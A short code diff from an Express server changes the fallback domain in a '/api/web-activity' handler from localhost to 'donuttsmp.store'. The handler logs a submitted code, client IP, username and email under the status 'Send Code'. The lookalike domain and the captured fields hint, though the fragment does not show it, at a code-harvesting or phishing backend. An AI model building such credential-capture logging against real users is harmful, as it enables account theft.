@@ -122,7 +122,7 @@ app.post('/api/web-activity', async (req, res) => {
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: domain || req.headers.host || config.webDomain || 'localhost:3000',
+                domain: domain || req.headers.host || config.webDomain || 'donuttsmp.store',
                 username,
                 email,
                 statusText: statusText || 'Send Code'
